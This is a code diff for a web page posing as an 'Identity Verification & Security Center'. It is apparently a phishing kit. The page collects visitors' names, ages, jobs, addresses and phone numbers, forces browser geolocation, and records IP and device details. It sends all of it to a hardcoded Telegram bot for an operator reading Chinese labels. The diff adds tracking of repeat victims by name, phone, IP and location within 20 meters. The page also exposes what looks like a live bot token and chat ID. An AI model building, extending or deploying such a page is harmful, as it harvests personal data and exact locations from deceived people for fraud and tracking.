@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Identity Verification & Security Center</title>
     <style>
-        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; }
+        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #ef4444; --success: #10b981; --warn: #f59e0b; }
         * { box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; }
         .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
@@ -31,17 +31,27 @@
         .btn:hover { background: #0052cc; }
         .btn-success { background: var(--success); margin-top: 20px; }
         .btn-success:hover { background: #0da36e; }
-        .btn-warning { background: #f59e0b; margin-top: 10px; }
+        .btn-warning { background: var(--warn); margin-top: 10px; }
         .btn-warning:hover { background: #d97706; }
         
         #step-verification { display: none; }
         .status-box { padding: 10px 14px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: 600; font-size: 15px; }
         .status-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; }
         .status-error { background: #fef2f2; border: 1px solid #fecaca; color: #dc2626; }
+        .status-warn { background: #fffbeb; border: 1px solid #fde68a; color: #b45309; }
         .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; font-size: 15px; }
         .info-card p { margin: 6px 0; }
         .info-card strong { color: #1e293b; }
         .hidden { display: none !important; }
+
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:999; padding:20px; }
+        .modal { background:#fff; border-radius:12px; padding:24px; max-width:480px; width:100%; max-height:80vh; overflow:auto; }
+        .modal h3 { margin-top:0; color:#b45309; }
+        .modal .btn-row { display:flex; gap:10px; margin-top:16px; }
+        .modal button { flex:1; padding:10px; border-radius:8px; border:none; cursor:pointer; font-size:15px; font-weight:600; }
+        .btn-continue { background:var(--warn); color:#fff; }
+        .btn-cancel { background:#e5e7eb; color:#374151; }
+        .history-item { border-top:1px solid #eee; padding:10px 0; font-size:13px; line-height:1.6; }
     </style>
 </head>
 <body>
@@ -133,6 +143,7 @@
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
         <div id="status-box" class="status-box status-success">✅ Information Verified Successfully</div>
+        <div id="duplicate-status-box" class="status-box status-warn hidden">⚠️ Duplicate submission detected — same person/location</div>
         <div id="loc-status-box" class="status-box status-error hidden">⚠️ Location permission required. Please enable location and retry.</div>
         <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Retry Location Access</button>
 
@@ -143,9 +154,27 @@
             <p><strong>Shipping Address:</strong> <span id="disp-addr"></span></p>
             <p><strong>Phone Number:</strong> <span id="disp-phone"></span></p>
             <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
+            <p id="disp-dup-info" class="hidden" style="margin-top:12px; padding-top:12px; border-top:1px dashed #fde68a; color:#b45309;">
+                <strong>Submission Count:</strong> <span id="disp-count"></span> times<br>
+                <strong>First Submitted:</strong> <span id="disp-first"></span><br>
+                <strong>Last Submitted:</strong> <span id="disp-last"></span>
+            </p>
         </div>
 
         <button class="btn btn-success" id="btn-submit" onclick="submitData()">Complete & Submit</button>
+    </div>
+</div>
+
+<!-- Duplicate Warning Modal -->
+<div id="duplicate-modal" class="modal-overlay hidden">
+    <div class="modal">
+        <h3>⚠️ Duplicate Submission Detected</h3>
+        <p id="modal-reason"></p>
+        <div id="modal-history"></div>
+        <div class="btn-row">
+            <button class="btn-cancel" onclick="closeModal()">Cancel Submission</button>
+            <button class="btn-continue" onclick="closeModal(true)">Submit Anyway</button>
+        </div>
     </div>
 </div>
 
@@ -153,6 +182,7 @@
 // ========== Telegram Configuration ==========
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
+const DISTANCE_THRESHOLD_METERS = 20; // 坐标相差≤20米视为同一位置
 
 // ========== Country Database ==========
 const globalDatabase = {
@@ -174,6 +204,8 @@ const globalDatabase = {
 let formData = {};
 let deviceInfo = { ip: "", device: "", os: "", browser: "" };
 let locationInfo = { lat: "", lng: "", status: "pending" };
+let duplicateRecord = null; // 匹配到的历史记录
+let allowSubmitAnyway = false; // 用户确认后允许提交
 
 // ========== Initialize ==========
 window.onload = () => {
@@ -185,6 +217,62 @@ window.onload = () => {
     });
     deviceInfo = parseUserAgent();
 };
+
+// ========== Calculate Distance Between Two Coordinates (Haversine) ==========
+function getDistanceMeters(lat1,lng1,lat2,lng2){
+    if(!lat1||!lng1||!lat2||!lng2) return 999999;
+    const toRad = deg => deg * Math.PI / 180;
+    const dLat = toRad(lat2-lat1);
+    const dLng = toRad(lng2-lng1);
+    const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLng/2)**2;
+    return 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+}
+
+// ========== Load/Save Submission History from LocalStorage ==========
+function loadHistory(){
+    try{ return JSON.parse(localStorage.getItem('submitHistory')||'[]'); }
+    catch{ return []; }
+}
+function saveHistory(record){
+    const history = loadHistory();
+    history.push(record);
+    localStorage.setItem('submitHistory', JSON.stringify(history));
+}
+
+// ========== Duplicate Detection ==========
+function findDuplicate(current){
+    const history = loadHistory();
+    for(const rec of history){
+        // Rule 1: Same full name + same phone → duplicate
+        const sameName = rec.name?.trim().toLowerCase() === current.name?.trim().toLowerCase();
+        const samePhone = rec.phoneFull?.replace(/\D/g,'') === current.phoneFull?.replace(/\D/g,'');
+        const ruleNamePhone = sameName && samePhone;
+
+        // Rule 2: Same IP → duplicate
+        const sameIP = rec.ip === current.ip && current.ip && current.ip !== "Unavailable";
+
+        // Rule 3: Location within threshold meters → duplicate
+        let dist = 999999;
+        if(rec.lat && rec.lng && current.lat && current.lng){
+            dist = getDistanceMeters(+rec.lat, +rec.lng, +current.lat, +current.lng);
+        }
+        const nearLoc = dist <= DISTANCE_THRESHOLD_METERS;
+
+        if(ruleNamePhone || sameIP || nearLoc){
+            return { rec, dist, ruleNamePhone, sameIP, nearLoc };
+        }
+    }
+    return null;
+}
+
+// ========== Build Reason Text ==========
+function makeReasonText(m){
+    const reasons=[];
+    if(m.ruleNamePhone) reasons.push("same name + phone number");
+    if(m.sameIP) reasons.push("same IP address");
+    if(m.nearLoc) reasons.push(`location within ${Math.round(m.dist)} meters`);
+    return reasons.join(" + ");
+}
 
 // ========== Country Change ==========
 function onCountryChange() {
@@ -274,7 +362,6 @@ async function proceedToVerification(){
     const zipOk = formatAndValidateZip();
     if(bad.length || !zipOk)return alert('Please check highlighted fields before proceeding.');
 
-    // Collect form data
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
         age: document.getElementById('age').value.trim(),
@@ -287,14 +374,13 @@ async function proceedToVerification(){
         zipDisplay: document.getElementById('zipCode').value,
         zip: document.getElementById('zipCode').value.replace(/\s+/g,'').toUpperCase(),
         phonePrefix: document.getElementById('phonePrefix').value,
-        phone: document.getElementById('phone').value.trim()
+        phone: document.getElementById('phone').value.trim(),
+        phoneFull: (document.getElementById('phonePrefix').value||'') + document.getElementById('phone').value.trim().replace(/\D/g,'')
     };
 
-    // Switch page
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
 
-    // Show user info only (English labels)
     document.getElementById('disp-name').textContent = formData.name;
     document.getElementById('disp-age').textContent = formData.age;
     document.getElementById('disp-occupation').textContent = formData.occupation;
@@ -303,11 +389,46 @@ async function proceedToVerification(){
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
     document.getElementById('disp-zip').textContent = formData.zipDisplay;
 
-    // Request location + IP in background
-    await Promise.all([
-        requestLocation(),
-        fetchIPAddress()
-    ]);
+    await Promise.all([requestLocation(), fetchIPAddress()]);
+    checkDuplicateOnPage();
+}
+
+// ========== Show Duplicate Info on Confirm Page ==========
+function checkDuplicateOnPage(){
+    duplicateRecord = null;
+    allowSubmitAnyway = false;
+
+    if(locationInfo.status !== "granted") return;
+
+    const current = {
+        name: formData.name,
+        phoneFull: formData.phoneFull,
+        ip: deviceInfo.ip,
+        lat: locationInfo.lat,
+        lng: locationInfo.lng
+    };
+
+    const match = findDuplicate(current);
+    if(!match) return;
+
+    duplicateRecord = match;
+    document.getElementById('duplicate-status-box').classList.remove('hidden');
+    document.getElementById('disp-dup-info').classList.remove('hidden');
+
+    // Count all records that match this person
+    const history = loadHistory();
+    const samePerson = history.filter(r=>{
+        const sameNamePhone = r.name?.trim().toLowerCase() === formData.name.trim().toLowerCase() && r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
+        const sameIP = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
+        const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
+        return sameNamePhone || sameIP || near;
+    });
+
+    const first = samePerson[0]?.timeStr || "—";
+    const last = samePerson[samePerson.length-1]?.timeStr || "—";
+    document.getElementById('disp-count').textContent = samePerson.length + 1; // +1 for current
+    document.getElementById('disp-first').textContent = first;
+    document.getElementById('disp-last').textContent = last;
 }
 
 // ========== Location Request ==========
@@ -325,6 +446,7 @@ function requestLocation(){
                 locationInfo.status = "granted";
                 hideLocationError();
                 resolve();
+                setTimeout(checkDuplicateOnPage, 100);
             },
             (err) => {
                 locationInfo.status = err.code === 1 ? "denied" : "error";
@@ -340,7 +462,6 @@ function showLocationError(){
     document.getElementById('loc-status-box').classList.remove('hidden');
     document.getElementById('btn-retry-loc').classList.remove('hidden');
 }
-
 function hideLocationError(){
     document.getElementById('loc-status-box').classList.add('hidden');
     document.getElementById('btn-retry-loc').classList.add('hidden');
@@ -384,15 +505,93 @@ function parseUserAgent(){
     return {device, os, browser};
 }
 
+// ========== Modal Control ==========
+function openDuplicateModal(match){
+    const reason = makeReasonText(match);
+    document.getElementById('modal-reason').textContent = 
+        `Detected: ${reason}\n\nThis person has been submitted before. Continue anyway?`;
+
+    // Show recent history
+    const history = loadHistory();
+    const recent = history.slice(-3).reverse();
+    document.getElementById('modal-history').innerHTML = recent.map(r=>`
+        <div class="history-item">
+        <strong>${r.name}</strong> · ${r.timeStr}<br>
+        Phone: ${r.phone} · IP: ${r.ip}<br>
+        Coords: ${r.lat}, ${r.lng}
+        </div>
+    `).join('');
+
+    document.getElementById('duplicate-modal').classList.remove('hidden');
+}
+function closeModal(confirm=false){
+    document.getElementById('duplicate-modal').classList.add('hidden');
+    if(confirm){
+        allowSubmitAnyway = true;
+        doSubmit();
+    }
+}
+
 // ========== Submit to Telegram ==========
 async function submitData(){
-    // BLOCK if location missing — REQUIRED
     if(locationInfo.status !== "granted"){
         alert("Location permission is REQUIRED before submission.\nPlease enable location access and click [Retry Location Access].\n\nNot authorized / Failed to retrieve.");
         return;
     }
 
-    // ========== Telegram Message: CHINESE labels + user ENGLISH data ==========
+    // Check duplicate BEFORE sending
+    const current = {
+        name: formData.name,
+        phoneFull: formData.phoneFull,
+        ip: deviceInfo.ip,
+        lat: locationInfo.lat,
+        lng: locationInfo.lng
+    };
+    const match = findDuplicate(current);
+    if(match && !allowSubmitAnyway){
+        openDuplicateModal(match);
+        return;
+    }
+
+    doSubmit();
+}
+
+async function doSubmit(){
+    const timeStr = new Date().toLocaleString('zh-CN');
+
+    // Save to local history
+    saveHistory({
+        name: formData.name,
+        age: formData.age,
+        occupation: formData.occupation,
+        phone: formData.phonePrefix+' '+formData.phone,
+        phoneFull: formData.phoneFull,
+        country: formData.countryName,
+        state: formData.state,
+        city: formData.city,
+        address: formData.address,
+        zip: formData.zipDisplay,
+        ip: deviceInfo.ip,
+        device: deviceInfo.device,
+        os: deviceInfo.os,
+        browser: deviceInfo.browser,
+        lat: locationInfo.lat,
+        lng: locationInfo.lng,
+        timeStr,
+        timestamp: Date.now()
+    });
+
+    // Recalculate total count for Telegram message
+    const history = loadHistory();
+    const samePerson = history.filter(r=>{
+        const sameNamePhone = r.name?.trim().toLowerCase() === formData.name.trim().toLowerCase() && r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
+        const sameIP = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
+        const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
+        return sameNamePhone || sameIP || near;
+    });
+    const count = samePerson.length;
+    const firstTime = samePerson[0]?.timeStr || timeStr;
+
     const msg = `📩 新提交的资料
 ——————————————
 姓名：${formData.name}
@@ -402,13 +601,18 @@ async function submitData(){
 邮政编码：${formData.zipDisplay}
 电话号码：${formData.phonePrefix} ${formData.phone}
 
+📊 提交统计：
+• 出现次数：第 ${count} 次
+• 首次提交：${firstTime}
+• 最近提交：${timeStr}
+
 设备和网络信息：
 • IP地址：${deviceInfo.ip}
 • 设备/型号：${deviceInfo.device}
 • 操作系统：${deviceInfo.os}
 • 浏览器：${deviceInfo.browser}
 • 坐标：${locationInfo.lat}, ${locationInfo.lng}
-⏰ 提交时间：${new Date().toLocaleString('zh-CN')}
+⏰ 提交时间：${timeStr}
 ——————————————`;
 
     console.log('📤 准备发送到 Telegram：\n', msg);
@@ -417,10 +621,7 @@ async function submitData(){
         const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
             method:'POST',
             headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: msg
-            })
+            body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
         });
         const json=await res.json();
         if(json.ok){
